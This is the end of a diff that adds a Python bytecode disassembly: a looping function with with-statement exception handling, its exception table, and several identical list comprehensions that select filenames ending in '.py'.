+330        2926 LOAD_CONST               0 (None)
+           2928 LOAD_CONST               0 (None)
+           2930 LOAD_CONST               0 (None)
+           2932 PRECALL                  2
+           2936 CALL                     2
+           2946 POP_TOP
+           2948 JUMP_FORWARD            11 (to 2972)
+        >> 2950 PUSH_EXC_INFO
+           2952 WITH_EXCEPT_START
+           2954 POP_JUMP_FORWARD_IF_TRUE     4 (to 2964)
+           2956 RERAISE                  2
+        >> 2958 COPY                     3
+           2960 POP_EXCEPT
+           2962 RERAISE                  1
+        >> 2964 POP_TOP
+           2966 POP_EXCEPT
+           2968 POP_TOP
+           2970 POP_TOP
+        >> 2972 JUMP_BACKWARD          139 (to 2696)
+
+329     >> 2974 LOAD_CONST               0 (None)
+           2976 RETURN_VALUE
+        >> 2978 PUSH_EXC_INFO
+
+337        2980 POP_TOP
+           2982 POP_EXCEPT
+           2984 LOAD_CONST               0 (None)
+           2986 RETURN_VALUE
+        >> 2988 COPY                     3
+           2990 POP_EXCEPT
+           2992 RERAISE                  1
+ExceptionTable:
+  80 to 242 -> 428 [0]
+  244 to 376 -> 402 [2] lasti
+  378 to 400 -> 428 [0]
+  402 to 408 -> 410 [4] lasti
+  410 to 414 -> 428 [0]
+  416 to 416 -> 410 [4] lasti
+  418 to 424 -> 428 [0]
+  428 to 430 -> 436 [1] lasti
+  444 to 606 -> 792 [0]
+  608 to 740 -> 766 [2] lasti
+  742 to 764 -> 792 [0]
+  766 to 772 -> 774 [4] lasti
+  774 to 778 -> 792 [0]
+  780 to 780 -> 774 [4] lasti
+  782 to 788 -> 792 [0]
+  792 to 794 -> 800 [1] lasti
+  808 to 970 -> 1156 [0]
+  972 to 1104 -> 1130 [2] lasti
+  1106 to 1128 -> 1156 [0]
+  1130 to 1136 -> 1138 [4] lasti
+  1138 to 1142 -> 1156 [0]
+  1144 to 1144 -> 1138 [4] lasti
+  1146 to 1152 -> 1156 [0]
+  1156 to 1158 -> 1164 [1] lasti
+  1172 to 1334 -> 1520 [0]
+  1336 to 1468 -> 1494 [2] lasti
+  1470 to 1492 -> 1520 [0]
+  1494 to 1500 -> 1502 [4] lasti
+  1502 to 1506 -> 1520 [0]
+  1508 to 1508 -> 1502 [4] lasti
+  1510 to 1516 -> 1520 [0]
+  1520 to 1522 -> 1528 [1] lasti
+  1536 to 1698 -> 1884 [0]
+  1700 to 1832 -> 1858 [2] lasti
+  1834 to 1856 -> 1884 [0]
+  1858 to 1864 -> 1866 [4] lasti
+  1866 to 1870 -> 1884 [0]
+  1872 to 1872 -> 1866 [4] lasti
+  1874 to 1880 -> 1884 [0]
+  1884 to 1886 -> 1892 [1] lasti
+  1900 to 2062 -> 2248 [0]
+  2064 to 2196 -> 2222 [2] lasti
+  2198 to 2220 -> 2248 [0]
+  2222 to 2228 -> 2230 [4] lasti
+  2230 to 2234 -> 2248 [0]
+  2236 to 2236 -> 2230 [4] lasti
+  2238 to 2244 -> 2248 [0]
+  2248 to 2250 -> 2256 [1] lasti
+  2264 to 2426 -> 2612 [0]
+  2428 to 2560 -> 2586 [2] lasti
+  2562 to 2584 -> 2612 [0]
+  2586 to 2592 -> 2594 [4] lasti
+  2594 to 2598 -> 2612 [0]
+  2600 to 2600 -> 2594 [4] lasti
+  2602 to 2608 -> 2612 [0]
+  2612 to 2614 -> 2620 [1] lasti
+  2628 to 2790 -> 2978 [0]
+  2792 to 2924 -> 2950 [2] lasti
+  2926 to 2948 -> 2978 [0]
+  2950 to 2956 -> 2958 [4] lasti
+  2958 to 2962 -> 2978 [0]
+  2964 to 2964 -> 2958 [4] lasti
+  2966 to 2972 -> 2978 [0]
+  2978 to 2980 -> 2988 [1] lasti
+
+Disassembly of <code object <listcomp> at 0x7871277730, file "<x>", line 237>:
+237           0 RESUME                   0
+              2 BUILD_LIST               0
+              4 LOAD_FAST                0 (.0)
+        >>    6 FOR_ITER                25 (to 58)
+              8 STORE_FAST               1 (f)
+             10 LOAD_FAST                1 (f)
+             12 LOAD_METHOD              0 (endswith)
+             34 LOAD_CONST               0 ('.py')
+             36 PRECALL                  1
+             40 CALL                     1
+             50 POP_JUMP_BACKWARD_IF_FALSE    23 (to 6)
+             52 LOAD_FAST                1 (f)
+             54 LIST_APPEND              2
+             56 JUMP_BACKWARD           26 (to 6)
+        >>   58 RETURN_VALUE
+
+Disassembly of <code object <listcomp> at 0x7871277830, file "<x>", line 250>:
+250           0 RESUME                   0
+              2 BUILD_LIST               0
+              4 LOAD_FAST                0 (.0)
+        >>    6 FOR_ITER                25 (to 58)
+              8 STORE_FAST               1 (f)
+             10 LOAD_FAST                1 (f)
+             12 LOAD_METHOD              0 (endswith)
+             34 LOAD_CONST               0 ('.py')
+             36 PRECALL                  1
+             40 CALL                     1
+             50 POP_JUMP_BACKWARD_IF_FALSE    23 (to 6)
+             52 LOAD_FAST                1 (f)
+             54 LIST_APPEND              2
+             56 JUMP_BACKWARD           26 (to 6)
+        >>   58 RETURN_VALUE
+
+Disassembly of <code object <listcomp> at 0x7871277930, file "<x>", line 263>:
+263           0 RESUME                   0
+              2 BUILD_LIST               0
+              4 LOAD_FAST                0 (.0)
+        >>    6 FOR_ITER                25 (to 58)
+              8 STORE_FAST               1 (f)
+             10 LOAD_FAST                1 (f)
+             12 LOAD_METHOD              0 (endswith)
+             34 LOAD_CONST               0 ('.py')
+             36 PRECALL                  1
+             40 CALL                     1
+             50 POP_JUMP_BACKWARD_IF_FALSE    23 (to 6)
+             52 LOAD_FAST                1 (f)
+             54 LIST_APPEND              2
+             56 JUMP_BACKWARD           26 (to 6)
+        >>   58 RETURN_VALUE
+
+Disassembly of <code object <listcomp> at 0x7871277a30, file "<x>", line 276>:
+276           0 RESUME                   0
+              2 BUILD_LIST               0
+              4 LOAD_FAST                0 (.0)
+        >>    6 FOR_ITER                25 (to 58)
+              8 STORE_FAST               1 (f)
+             10 LOAD_FAST                1 (f)
+             12 LOAD_METHOD              0 (endswith)
+             34 LOAD_CONST               0 ('.py')
+             36 PRECALL                  1
+             40 CALL                     1
+             50 POP_JUMP_BACKWARD_IF_FALSE    23 (to 6)
+             52 LOAD_FAST                1 (f)
+             54 LIST_APPEND              2
+             56 JUMP_BACKWARD           26 (to 6)
+        >>   58 RETURN_VALUE
+
+Disassembly of <code object <listcomp> at 0x7871277b30, file "<x>", line 289>:
+289           0 RESUME                   0
+              2 BUILD_LIST               0
+              4 LOAD_FAST                0 (.0)
+        >>    6 FOR_ITER                25 (to 58)
+              8 STORE_FAST               1 (f)
+             10 LOAD_FAST                1 (f)
+             12 LOAD_METHOD              0 (endswith)
+             34 LOAD_CONST               0 ('.py')
+             36 PRECALL                  1
+             40 CALL                     1
+             50 POP_JUMP_BACKWARD_IF_FALSE    23 (to 6)
+             52 LOAD_FAST                1 (f)
+             54 LIST_APPEND              2
+             56 JUMP_BACKWARD           26 (to 6)
+        >>   58 RETURN_VALUE
+
+Disassembly of <code object <listcomp> at 0x7871277c30, file "<x>", line 302>:
+302           0 RESUME                   0
+              2 BUILD_LIST               0
+              4 LOAD_FAST                0 (.0)
+        >>    6 FOR_ITER                25 (to 58)
+              8 STORE_FAST               1 (f)
+             10 LOAD_FAST                1 (f)
+             12 LOAD_METHOD              0 (endswith)
+             34 LOAD_CONST               0 ('.py')
+             36 PRECALL                  1
+             40 CALL                     1
+             50 POP_JUMP_BACKWARD_IF_FALSE    23 (to 6)
+             52 LOAD_FAST                1 (f)
+             54 LIST_APPEND              2
+             56 JUMP_BACKWARD           26 (to 6)
+        >>   58 RETURN_VALUE
+
+Disassembly of <code object <listcomp> at 0x7871277d30, file "<x>", line 315>:
+315           0 RESUME                   0
+              2 BUILD_LIST               0
+              4 LOAD_FAST                0 (.0)
+        >>    6 FOR_ITER                25 (to 58)
+              8 STORE_FAST               1 (f)
+             10 LOAD_FAST                1 (f)
+             12 LOAD_METHOD              0 (endswith)
+             34 LOAD_CONST               0 ('.py')
+             36 PRECALL                  1
+             40 CALL                     1
+             50 POP_JUMP_BACKWARD_IF_FALSE    23 (to 6)
+             52 LOAD_FAST                1 (f)
+             54 LIST_APPEND              2
+             56 JUMP_BACKWARD           26 (to 6)
+        >>   58 RETURN_VALUE
+
+Disassembly of <code object <listcomp> at 0x7871277e30, file "<x>", line 328>:
+328           0 RESUME                   0
+              2 BUILD_LIST               0
+              4 LOAD_FAST                0 (.0)
+        >>    6 FOR_ITER                25 (to 58)
+              8 STORE_FAST               1 (f)
+             10 LOAD_FAST                1 (f)
+             12 LOAD_METHOD              0 (endswith)
+             34 LOAD_CONST               0 ('.py')
+             36 PRECALL                  1
+             40 CALL                     1
+             50 POP_JUMP_BACKWARD_IF_FALSE    23 (to 6)
+             52 LOAD_FAST                1 (f)
+             54 LIST_APPEND              2
+             56 JUMP_BACKWARD           26 (to 6)
+        >>   58 RETURN_VALUE
